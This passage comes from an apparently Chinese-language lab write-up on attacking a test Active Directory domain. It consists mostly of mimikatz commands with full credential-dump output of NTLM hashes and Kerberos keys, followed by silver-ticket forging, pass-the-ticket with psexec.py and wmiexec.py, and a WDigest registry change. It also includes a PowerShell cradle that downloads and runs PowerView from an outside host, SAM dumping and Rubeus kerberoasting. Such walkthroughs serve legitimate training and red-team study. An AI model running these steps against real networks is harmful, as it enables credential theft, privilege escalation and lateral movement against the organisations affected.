class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\AStar\Downloads\hfs2.3b&gt; ./mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords &quot; exit</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&apos;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &apos;## v ##&apos;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &apos;#####&apos;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line">Privilege &apos;20&apos; OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 829507 (00000000:000ca843)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : AStar</span><br><span class="line">Domain            : TRAINING</span><br><span class="line">Logon Server      : DC01</span><br><span class="line">Logon Time        : 2020/11/15 上午 04:27:02</span><br><span class="line">SID               : S-1-5-21-2501991368-4163896689-842069156-1104</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : AStar</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * NTLM     : e19ccf75ee54e06b06a5907af13cef42</span><br><span class="line">         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63</span><br><span class="line">         * DPAPI    : 917099b4e44a496d0d6d6d5d97a48bf2</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : AStar</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : AStar</span><br><span class="line">         * Domain   : TRAINING.LOCAL</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 829016 (00000000:000ca658)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : AStar</span><br><span class="line">Domain            : TRAINING</span><br><span class="line">Logon Server      : DC01</span><br><span class="line">Logon Time        : 2020/11/15 上午 04:27:02</span><br><span class="line">SID               : S-1-5-21-2501991368-4163896689-842069156-1104</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : AStar</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * NTLM     : e19ccf75ee54e06b06a5907af13cef42</span><br><span class="line">         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63</span><br><span class="line">         * DPAPI    : 917099b4e44a496d0d6d6d5d97a48bf2</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : AStar</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : AStar</span><br><span class="line">         * Domain   : TRAINING.LOCAL</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/11/15 上午 04:23:42</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 71939 (00000000:00011903)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/11/15 上午 04:23:40</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * NTLM     : 9161a2061ca56201e32556abf5a85059</span><br><span class="line">         * SHA1     : c62e7111e14a25ecaa00a1e374c22eeee2aa5c67</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : training.local</span><br><span class="line">         * Password : 57 42 60 2c f7 fd 6d cf 1b 56 e5 22 f7 6b 28 c8 f8 ae 26 e2 5b 7b f3 b1 88 13 95 39 9b 7f a2 b4 27 64 61 e9 28 d2 a1 c6 1b 73 b7 9a 0d dd e2 aa 1d 7f 3a c1 d5 15 c9 fa e7 51 16 99 a0 57 82 3b 44 e4 8e 5d 4c 91 73 ea b1 df 5b 83 5c 13 dd 32 8e 8e 16 dc 0c 0c b6 17 95 a2 de a4 dc 6a 71 18 dc 6d 6d de 60 ea 26 e9 05 b1 72 5b b7 66 96 d8 c9 c6 78 ae f9 d7 bd 4f 43 f7 87 58 26 28 02 5c a2 ea c0 01 6a 95 7a 3b 6d ed aa 95 4c 49 10 f7 30 9b 3f ed e8 b9 e8 86 65 44 1f ad 79 f0 2f d4 47 5c 3d 20 21 91 1e b8 0e 7c 99 25 5f e8 92 8b 14 ca 86 cd 8e 2f 88 29 06 8d 33 82 34 1e c7 82 86 df 27 75 a9 ed 51 10 83 06 d9 bf 2e 5a 20 f7 53 bb 8e e8 ad 99 cd 97 d3 51 b9 b4 d8 6c 19 c3 32 3e 72 99 90 d3 36 46 dc b7 d3 0e 3a c8 ca 18</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 71921 (00000000:000118f1)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/11/15 上午 04:23:40</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * NTLM     : 9161a2061ca56201e32556abf5a85059</span><br><span class="line">         * SHA1     : c62e7111e14a25ecaa00a1e374c22eeee2aa5c67</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : training.local</span><br><span class="line">         * Password : 57 42 60 2c f7 fd 6d cf 1b 56 e5 22 f7 6b 28 c8 f8 ae 26 e2 5b 7b f3 b1 88 13 95 39 9b 7f a2 b4 27 64 61 e9 28 d2 a1 c6 1b 73 b7 9a 0d dd e2 aa 1d 7f 3a c1 d5 15 c9 fa e7 51 16 99 a0 57 82 3b 44 e4 8e 5d 4c 91 73 ea b1 df 5b 83 5c 13 dd 32 8e 8e 16 dc 0c 0c b6 17 95 a2 de a4 dc 6a 71 18 dc 6d 6d de 60 ea 26 e9 05 b1 72 5b b7 66 96 d8 c9 c6 78 ae f9 d7 bd 4f 43 f7 87 58 26 28 02 5c a2 ea c0 01 6a 95 7a 3b 6d ed aa 95 4c 49 10 f7 30 9b 3f ed e8 b9 e8 86 65 44 1f ad 79 f0 2f d4 47 5c 3d 20 21 91 1e b8 0e 7c 99 25 5f e8 92 8b 14 ca 86 cd 8e 2f 88 29 06 8d 33 82 34 1e c7 82 86 df 27 75 a9 ed 51 10 83 06 d9 bf 2e 5a 20 f7 53 bb 8e e8 ad 99 cd 97 d3 51 b9 b4 d8 6c 19 c3 32 3e 72 99 90 d3 36 46 dc b7 d3 0e 3a c8 ca 18</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : PC01$</span><br><span class="line">Domain            : TRAINING</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/11/15 上午 04:23:38</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * NTLM     : 9161a2061ca56201e32556abf5a85059</span><br><span class="line">         * SHA1     : c62e7111e14a25ecaa00a1e374c22eeee2aa5c67</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : pc01$</span><br><span class="line">         * Domain   : training.local</span><br><span class="line">         * Password : 57 42 60 2c f7 fd 6d cf 1b 56 e5 22 f7 6b 28 c8 f8 ae 26 e2 5b 7b f3 b1 88 13 95 39 9b 7f a2 b4 27 64 61 e9 28 d2 a1 c6 1b 73 b7 9a 0d dd e2 aa 1d 7f 3a c1 d5 15 c9 fa e7 51 16 99 a0 57 82 3b 44 e4 8e 5d 4c 91 73 ea b1 df 5b 83 5c 13 dd 32 8e 8e 16 dc 0c 0c b6 17 95 a2 de a4 dc 6a 71 18 dc 6d 6d de 60 ea 26 e9 05 b1 72 5b b7 66 96 d8 c9 c6 78 ae f9 d7 bd 4f 43 f7 87 58 26 28 02 5c a2 ea c0 01 6a 95 7a 3b 6d ed aa 95 4c 49 10 f7 30 9b 3f ed e8 b9 e8 86 65 44 1f ad 79 f0 2f d4 47 5c 3d 20 21 91 1e b8 0e 7c 99 25 5f e8 92 8b 14 ca 86 cd 8e 2f 88 29 06 8d 33 82 34 1e c7 82 86 df 27 75 a9 ed 51 10 83 06 d9 bf 2e 5a 20 f7 53 bb 8e e8 ad 99 cd 97 d3 51 b9 b4 d8 6c 19 c3 32 3e 72 99 90 d3 36 46 dc b7 d3 0e 3a c8 ca 18</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 47523 (00000000:0000b9a3)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : UMFD-1</span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/11/15 上午 04:23:36</span><br><span class="line">SID               : S-1-5-96-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * NTLM     : 9161a2061ca56201e32556abf5a85059</span><br><span class="line">         * SHA1     : c62e7111e14a25ecaa00a1e374c22eeee2aa5c67</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : training.local</span><br><span class="line">         * Password : 57 42 60 2c f7 fd 6d cf 1b 56 e5 22 f7 6b 28 c8 f8 ae 26 e2 5b 7b f3 b1 88 13 95 39 9b 7f a2 b4 27 64 61 e9 28 d2 a1 c6 1b 73 b7 9a 0d dd e2 aa 1d 7f 3a c1 d5 15 c9 fa e7 51 16 99 a0 57 82 3b 44 e4 8e 5d 4c 91 73 ea b1 df 5b 83 5c 13 dd 32 8e 8e 16 dc 0c 0c b6 17 95 a2 de a4 dc 6a 71 18 dc 6d 6d de 60 ea 26 e9 05 b1 72 5b b7 66 96 d8 c9 c6 78 ae f9 d7 bd 4f 43 f7 87 58 26 28 02 5c a2 ea c0 01 6a 95 7a 3b 6d ed aa 95 4c 49 10 f7 30 9b 3f ed e8 b9 e8 86 65 44 1f ad 79 f0 2f d4 47 5c 3d 20 21 91 1e b8 0e 7c 99 25 5f e8 92 8b 14 ca 86 cd 8e 2f 88 29 06 8d 33 82 34 1e c7 82 86 df 27 75 a9 ed 51 10 83 06 d9 bf 2e 5a 20 f7 53 bb 8e e8 ad 99 cd 97 d3 51 b9 b4 d8 6c 19 c3 32 3e 72 99 90 d3 36 46 dc b7 d3 0e 3a c8 ca 18</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 47449 (00000000:0000b959)</span><br><span class="line">Session           : Interactive from 0</span><br><span class="line">User Name         : UMFD-0</span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/11/15 上午 04:23:36</span><br><span class="line">SID               : S-1-5-96-0-0</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * NTLM     : 9161a2061ca56201e32556abf5a85059</span><br><span class="line">         * SHA1     : c62e7111e14a25ecaa00a1e374c22eeee2aa5c67</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : training.local</span><br><span class="line">         * Password : 57 42 60 2c f7 fd 6d cf 1b 56 e5 22 f7 6b 28 c8 f8 ae 26 e2 5b 7b f3 b1 88 13 95 39 9b 7f a2 b4 27 64 61 e9 28 d2 a1 c6 1b 73 b7 9a 0d dd e2 aa 1d 7f 3a c1 d5 15 c9 fa e7 51 16 99 a0 57 82 3b 44 e4 8e 5d 4c 91 73 ea b1 df 5b 83 5c 13 dd 32 8e 8e 16 dc 0c 0c b6 17 95 a2 de a4 dc 6a 71 18 dc 6d 6d de 60 ea 26 e9 05 b1 72 5b b7 66 96 d8 c9 c6 78 ae f9 d7 bd 4f 43 f7 87 58 26 28 02 5c a2 ea c0 01 6a 95 7a 3b 6d ed aa 95 4c 49 10 f7 30 9b 3f ed e8 b9 e8 86 65 44 1f ad 79 f0 2f d4 47 5c 3d 20 21 91 1e b8 0e 7c 99 25 5f e8 92 8b 14 ca 86 cd 8e 2f 88 29 06 8d 33 82 34 1e c7 82 86 df 27 75 a9 ed 51 10 83 06 d9 bf 2e 5a 20 f7 53 bb 8e e8 ad 99 cd 97 d3 51 b9 b4 d8 6c 19 c3 32 3e 72 99 90 d3 36 46 dc b7 d3 0e 3a c8 ca 18</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 46346 (00000000:0000b50a)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/11/15 上午 04:23:35</span><br><span class="line">SID               :</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * NTLM     : 9161a2061ca56201e32556abf5a85059</span><br><span class="line">         * SHA1     : c62e7111e14a25ecaa00a1e374c22eeee2aa5c67</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : PC01$</span><br><span class="line">Domain            : TRAINING</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2020/11/15 上午 04:23:34</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC01$</span><br><span class="line">         * Domain   : TRAINING</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : pc01$</span><br><span class="line">         * Domain   : TRAINING.LOCAL</span><br><span class="line">         * Password : 57 42 60 2c f7 fd 6d cf 1b 56 e5 22 f7 6b 28 c8 f8 ae 26 e2 5b 7b f3 b1 88 13 95 39 9b 7f a2 b4 27 64 61 e9 28 d2 a1 c6 1b 73 b7 9a 0d dd e2 aa 1d 7f 3a c1 d5 15 c9 fa e7 51 16 99 a0 57 82 3b 44 e4 8e 5d 4c 91 73 ea b1 df 5b 83 5c 13 dd 32 8e 8e 16 dc 0c 0c b6 17 95 a2 de a4 dc 6a 71 18 dc 6d 6d de 60 ea 26 e9 05 b1 72 5b b7 66 96 d8 c9 c6 78 ae f9 d7 bd 4f 43 f7 87 58 26 28 02 5c a2 ea c0 01 6a 95 7a 3b 6d ed aa 95 4c 49 10 f7 30 9b 3f ed e8 b9 e8 86 65 44 1f ad 79 f0 2f d4 47 5c 3d 20 21 91 1e b8 0e 7c 99 25 5f e8 92 8b 14 ca 86 cd 8e 2f 88 29 06 8d 33 82 34 1e c7 82 86 df 27 75 a9 ed 51 10 83 06 d9 bf 2e 5a 20 f7 53 bb 8e e8 ad 99 cd 97 d3 51 b9 b4 d8 6c 19 c3 32 3e 72 99 90 d3 36 46 dc b7 d3 0e 3a c8 ca 18</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure></p>
<p>以 Silver Ticket 來說我們要取得的就是 <code>PC01</code> 的 NTLM hash ( 如果有的話也可以選擇 DC01 )</p>
<p>記得要以 <code>以系統管理員身分執行</code> 這樣子開啟 HFS 再打進去啟動 <code>mimikatz</code>,<br>不然的話 <code>sekurlsa::logonpasswords</code> 會出現 <code>(0x00000005)</code> 的錯誤，對應錯誤是 <code>ERROR_ACCESS_DENIED</code><br><a href="https://docs.microsoft.com/zh-tw/windows/win32/debug/system-error-codes--0-499-?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/windows/win32/debug/system-error-codes--0-499-?redirectedfrom=MSDN</a><br><img src="/img/2020/windows_ad/windows_AD_lab5_1.png" alt=""></p>
<p>如果還是失敗的話可以參考，不過需要使用者登出再登入才會生效<br><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code><br>ref: <a href="https://www.mdeditor.tw/pl/pY3X/zh-tw" target="_blank" rel="noopener">https://www.mdeditor.tw/pl/pY3X/zh-tw</a></p>
<p>然後透過 <code>whoami /all</code> 取得 domain sid</p>
<p>最後用 mimikatz 生成 Ticket<br><code>mimikatz.exe &quot;kerberos::golden /user:administrator /domain:training.local /target:pc01.training.local /sid:S-1-5-21-2501991368-4163896689-842069156 /rc4:9161a2061ca56201e32556abf5a85059 /service:cifs /ticket:administrator.silver.kirbi&quot; exit</code></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab5_4.png" alt=""></p>
<p>額外補充:<br>發現也可以透過 leak regedit 的方式取得 NTLM hash, 不過取得的完整性就沒有直接從 <code>LSASS</code> 的記憶體中撈出來的高</p>
<p><img src="/img/2020/windows_ad/windows_AD_lab5_2.png" alt=""><br><code>mimikatz.exe &quot;lsadump::sam /system:sys.hiv /sam:sam.hiv&quot; exit</code><br><img src="/img/2020/windows_ad/windows_AD_lab5_3.png" alt=""></p>
<p>另外 metasploit 的 <code>hashdump</code> 在這邊不管用<br><img src="/img/2020/windows_ad/windows_AD_lab5_err.png" alt=""></p>
<h3 id="Forge-silver-ticket-client"><a href="#Forge-silver-ticket-client" class="headerlink" title="Forge silver ticket (client)"></a>Forge silver ticket (client)</h3><p>將 Silver Ticket 拉回來 kali 本地轉成 <code>ccache</code>, 因為 impacket 是吃 <code>ccache</code> 的格式，而 mimikatz 是吃 <code>kirbi</code> 的格式<br><code>kirbi2ccache administrator.silver.kirbi  administrator.silver.ccache</code></p>
<h3 id="Pass-the-ticket-client"><a href="#Pass-the-ticket-client" class="headerlink" title="Pass the ticket (client)"></a>Pass the ticket (client)</h3><p><code>export KRB5CCNAME=administrator.silver.ccache</code></p>
<p><code>psexec.py  -k -no-pass training.local/administrator@pc01.training.local -target-ip 192.168.43.148 -debug</code><br><img src="/img/2020/windows_ad/windows_AD_lab5_5.png" alt=""><br>or<br><code>wmiexec.py  -k -no-pass training.local/administrator@pc01.training.local -dc-ip 192.168.43.148 -debug</code><br><img src="/img/2020/windows_ad/windows_AD_lab5_5-1.png" alt=""></p>
<h3 id="Kerberosting-client"><a href="#Kerberosting-client" class="headerlink" title="Kerberosting (client)"></a>Kerberosting (client)</h3><p>到上面為止我們做完了持續性滲透 (persistent)<br>這邊主要就是在 client 的電腦上尋找 <code>Service Account</code> 的相關資訊，但不知是不是因為我的環境沒有設定好， <code>psexec</code> 和 <code>wmiexec</code> 都沒辦法跟 AD 做連接，因此接下來的 <code>Kerberoasting</code> 還是會用 HFS 的 shell 進行<br>技術手法可以回去找 <code>LAB 3 - Kerberoasting</code><br>這邊主要會說跟 Lab 3 有差異的地方</p>
<p><code>powershell.exe -ExecutionPolicy UnRestricted &quot;iex (new-Object Net.WebClient).DownloadString(&#39;http://192.168.43.140:8000/PowerView.ps1&#39;); Get-domainuser -spn&quot;</code><br><img src="/img/2020/windows_ad/windows_AD_lab5_6.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">logoncount                    : 0</span><br><span class="line">iscriticalsystemobject        : True</span><br><span class="line">description                   : Key Distribution Center Service Account</span><br><span class="line">distinguishedname             : CN=krbtgt,CN=Users,DC=training,DC=local</span><br><span class="line">objectclass                   : &#123;top, person, organizationalPerson, user&#125;</span><br><span class="line">name                          : krbtgt</span><br><span class="line">showinadvancedviewonly        : True</span><br><span class="line">objectsid                     : S-1-5-21-2501991368-4163896689-842069156-502</span><br><span class="line">samaccountname                : krbtgt</span><br><span class="line">admincount                    : 1</span><br><span class="line">codepage                      : 0</span><br><span class="line">samaccounttype                : USER_OBJECT</span><br><span class="line">accountexpires                : NEVER</span><br><span class="line">cn                            : krbtgt</span><br><span class="line">whenchanged                   : 2020/10/9 下午 04:12:05</span><br><span class="line">instancetype                  : 4</span><br><span class="line">usncreated                    : 12324</span><br><span class="line">objectguid                    : 33c297e3-f91d-4c0b-b8ab-9571dd07f85c</span><br><span class="line">lastlogoff                    : 1601/1/1 上午 08:00:00</span><br><span class="line">objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">dscorepropagationdata         : &#123;2020/10/10 下午 05:51:07, 2020/10/10 下午 05:43:14, 2020/10/10 下午 04:30:26, 2020/10/</span><br><span class="line">                                10 下午 04:23:38...&#125;</span><br><span class="line">serviceprincipalname          : kadmin/changepw</span><br><span class="line">memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=training,DC=local</span><br><span class="line">lastlogon                     : 1601/1/1 上午 08:00:00</span><br><span class="line">badpasswordtime               : 2020/11/8 下午 07:50:45</span><br><span class="line">badpwdcount                   : 1</span><br><span class="line">useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT</span><br><span class="line">whencreated                   : 2020/10/9 下午 03:42:38</span><br><span class="line">countrycode                   : 0</span><br><span class="line">primarygroupid                : 513</span><br><span class="line">pwdlastset                    : 2020/10/9 下午 11:42:38</span><br><span class="line">msds-supportedencryptiontypes : 0</span><br><span class="line">usnchanged                    : 16496</span><br><span class="line"></span><br><span class="line">logoncount            : 0</span><br><span class="line">badpasswordtime       : 2020/11/8 下午 07:49:21</span><br><span class="line">mail                  : svc_account@training.local</span><br><span class="line">distinguishedname     : CN=svc_account,CN=Users,DC=training,DC=local</span><br><span class="line">objectclass           : &#123;top, person, organizationalPerson, user&#125;</span><br><span class="line">lastlogontimestamp    : 2020/11/8 下午 07:50:22</span><br><span class="line">name                  : svc_account</span><br><span class="line">objectsid             : S-1-5-21-2501991368-4163896689-842069156-1107</span><br><span class="line">samaccountname        : svc_account</span><br><span class="line">admincount            : 1</span><br><span class="line">codepage              : 0</span><br><span class="line">samaccounttype        : USER_OBJECT</span><br><span class="line">accountexpires        : NEVER</span><br><span class="line">cn                    : svc_account</span><br><span class="line">whenchanged           : 2020/11/8 上午 11:50:22</span><br><span class="line">instancetype          : 4</span><br><span class="line">title                 : only for testing</span><br><span class="line">objectguid            : 406a2e18-b52d-49ce-87f1-86428849ef47</span><br><span class="line">lastlogoff            : 1601/1/1 上午 08:00:00</span><br><span class="line">objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">dscorepropagationdata : &#123;2020/11/4 下午 08:52:52, 1601/1/1 上午 12:00:00&#125;</span><br><span class="line">serviceprincipalname  : HTTP/pc01</span><br><span class="line">usncreated            : 57503</span><br><span class="line">memberof              : CN=Domain Admins,CN=Users,DC=training,DC=local</span><br><span class="line">lastlogon             : 2020/11/8 下午 07:50:22</span><br><span class="line">badpwdcount           : 0</span><br><span class="line">useraccountcontrol    : NORMAL_ACCOUNT</span><br><span class="line">whencreated           : 2020/11/4 下午 08:27:52</span><br><span class="line">countrycode           : 0</span><br><span class="line">primarygroupid        : 513</span><br><span class="line">pwdlastset            : 2020/11/5 上午 04:27:52</span><br><span class="line">usnchanged            : 69738</span><br></pre></td></tr></table></figure></p>
<p><code>.\Rubeus.exe kerberoast /user:svc_account /outfile:svc_account.tgs.enc</code><br><img src="/img/2020/windows_ad/windows_AD_lab5_7.png" alt=""></p>
<p>下載到 kali 本地之後進行密碼爆破<br><img src="/img/2020/windows_ad/windows_AD_lab5_8.png" alt=""></p>
